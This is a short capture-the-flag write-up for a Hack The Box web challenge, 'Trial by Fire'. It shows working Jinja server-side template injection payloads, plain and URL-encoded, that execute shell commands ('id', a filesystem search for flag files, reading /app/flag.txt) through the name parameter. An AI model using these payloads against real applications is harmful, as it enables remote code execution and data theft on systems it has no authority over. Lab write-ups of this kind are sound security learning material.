---
title: Trial by Fire
tags:
  - CTF
  - HackTheBox
  - CyberApocalypse
  - Web
  - SSTI
date: 2025-03-21T00:00:00Z
---
![](Pasted%20image%2020250321194504.png)

![](Pasted%20image%2020250321210642.png)

If I press the ArrowUp:

![](Pasted%20image%2020250321212152.png)

I downloaded the zip and inspected the source files.

We have to implant sn SSTI in the name param, then loose and dump the globals of Jinja:

![](Pasted%20image%2020250321213422.png)

![](Pasted%20image%2020250321213403.png)

We can try a RCE via SSTI

```shell
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
# URL Encode
%7B%7B%20self%2E%5F%5Finit%5F%5F%2E%5F%5Fglobals%5F%5F%2E%5F%5Fbuiltins%5F%5F%2E%5F%5Fimport%5F%5F%28%27os%27%29%2Epopen%28%27id%27%29%2Eread%28%29%20%7D%7D
```

![](Pasted%20image%2020250321214344.png)

It works!

Now I'll try to enumerate and read the flag:

```shell
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('find / -type f -name "*flag*" 2>/dev/null').read() }}
# URL Encode
%7B%7B%20self%2E%5F%5Finit%5F%5F%2E%5F%5Fglobals%5F%5F%2E%5F%5Fbuiltins%5F%5F%2E%5F%5Fimport%5F%5F%28%27os%27%29%2Epopen%28%27find%20%2F%20%2Dtype%20f%20%2Dname%20%22%2Aflag%2A%22%202%3E%2Fdev%2Fnull%27%29%2Eread%28%29%20%7D%7D
```

![](Pasted%20image%2020250321214831.png)

```shell
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /app/flag.txt').read() }}
# URL Encode
%7B%7B%20self%2E%5F%5Finit%5F%5F%2E%5F%5Fglobals%5F%5F%2E%5F%5Fbuiltins%5F%5F%2E%5F%5Fimport%5F%5F%28%27os%27%29%2Epopen%28%27cat%20%2Fapp%2Fflag%2Etxt%27%29%2Eread%28%29%20%7D%7D
```

![](Pasted%20image%2020250321215043.png)

![](Pasted%20image%2020250321215059.png)